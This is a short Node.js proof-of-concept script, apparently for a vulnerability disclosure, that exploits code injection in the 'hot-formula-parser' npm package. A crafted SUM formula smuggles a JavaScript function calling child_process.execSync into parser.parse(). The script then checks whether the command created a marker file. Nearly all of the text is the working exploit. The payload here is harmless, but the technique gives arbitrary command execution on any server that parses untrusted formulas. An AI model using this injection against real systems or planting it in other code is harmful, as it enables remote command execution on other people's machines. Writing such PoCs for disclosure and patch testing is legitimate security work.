var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const FormulaParser = require('hot-formula-parser').Parser;
const fs = require('fs');
const path = './hot-formula-parser';
try {
    if (fs.existsSync(path)) {
        fs.unlinkSync(path);
    }
} catch (err) {
    console.error(err);
}
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + false + ' }');
let parser = new FormulaParser();
parser.parse('SUM([(function(){require(\'child_process\').execSync(\'fsutil file createnew hot-formula-parser 0\')})(),2])');
file_exist = fs.existsSync(path);
console.log('{ ' + file_exist + ', ' + true + ' }');
fs.unlink(path, function (err) {
});